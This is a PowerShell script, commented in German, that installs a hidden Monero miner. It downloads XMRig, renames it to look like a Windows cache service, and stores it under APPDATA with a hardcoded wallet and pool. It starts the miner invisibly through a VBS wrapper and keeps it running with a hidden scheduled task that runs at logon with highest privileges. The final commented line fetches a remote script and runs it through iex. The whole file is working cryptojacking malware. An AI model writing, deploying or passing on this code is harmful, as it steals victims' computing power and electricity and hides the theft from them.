#Requires -Version 5.1
$ErrorActionPreference = 'Stop'

# ====================== EINSTELLUNGEN ======================
$Wallet   = "4A2GjyjSnQqUjJMZvLju8YZaFSRZcb6qCC2Dw1DbebjNgCGviijSWjHRkeuPn5amLNP2h2P4vEBVi1bnG1BjqJ4yRotXGoF"
$Pool     = "pool.supportxmr.com:5555"
$Pass     = $env:USERNAME
$Threads  = 50
$TaskName = "WindowsCacheService"
# ===========================================================

$BaseDir    = Join-Path $env:APPDATA "Microsoft\Windows\Caches"
$InstallDir = Join-Path $BaseDir "bin"
$Config     = Join-Path $BaseDir "settings.json"
$Vbs        = Join-Path $BaseDir "init.vbs"
$ExeName    = "CacheService.exe"
$Xmrig      = Join-Path $InstallDir $ExeName

New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null

# ---------- settings.json ohne BOM schreiben ----------
$configJson = @"
{
    "autosave": true,
    "background": false,
    "colors": false,
    "title": false,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": $Threads,
        "asm": true,
        "argon2-impl": null
    },
    "opencl": { "enabled": false },
    "cuda":   { "enabled": false },
    "donate-level": 1,
    "log-file": null,
    "pools": [
        {
            "url": "$Pool",
            "user": "$Wallet",
            "pass": "$Pass",
            "keepalive": true,
            "enabled": true,
            "tls": false
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "watch": true,
    "pause-on-battery": false
}
"@

$utf8NoBom = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText($Config, $configJson, $utf8NoBom)

# ---------- Binary finden / herunterladen + umbenennen ----------
if (-not (Test-Path -LiteralPath $Xmrig -PathType Leaf)) {

    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $release = Invoke-RestMethod -Uri "https://api.github.com/repos/xmrig/xmrig/releases/latest" -Headers @{
        "User-Agent" = "Mozilla/5.0"
        "Accept"     = "application/vnd.github+json"
    }

    $asset = $release.assets | Where-Object {
        $_.name -match '^xmrig-[0-9]+\.[0-9]+\.[0-9]+-windows-x64\.zip$'
    } | Select-Object -First 1

    if (-not $asset) { throw "Download source unavailable." }

    $tempZip = Join-Path $env:TEMP ([guid]::NewGuid().ToString() + ".zip")

    try {
        Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $tempZip -UseBasicParsing
        Expand-Archive -LiteralPath $tempZip -DestinationPath $InstallDir -Force

        $original = Get-ChildItem -Path $InstallDir -Filter "xmrig.exe" -Recurse -ErrorAction SilentlyContinue |
                    Select-Object -First 1

        if (-not $original) { throw "Binary not found in archive." }

        Move-Item -LiteralPath $original.FullName -Destination $Xmrig -Force
        Get-ChildItem -Path $InstallDir -Exclude $ExeName | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
    }
    finally {
        Remove-Item -LiteralPath $tempZip -Force -ErrorAction SilentlyContinue
    }
}

# ---------- Hidden-Starter (VBS) ----------
$vbsContent = @"
CreateObject("Wscript.Shell").Run """$Xmrig"" --config=""$Config""", 0, False
"@
$utf8NoBom = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText($Vbs, $vbsContent, $utf8NoBom)

# ---------- Scheduled Task ----------
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue

$action   = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$Vbs`"" -WorkingDirectory $BaseDir
$trigger  = New-ScheduledTaskTrigger -AtLogOn
$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -ExecutionTimeLimit (New-TimeSpan -Days 0) `
    -Hidden `
    -MultipleInstances IgnoreNew

$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
    -Settings $settings -Principal $principal -Force | Out-Null

# ---------- Sofort starten ----------
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$Vbs`"" -WindowStyle Hidden

# irm https://pariedl.com/start-eco.ps1 | iex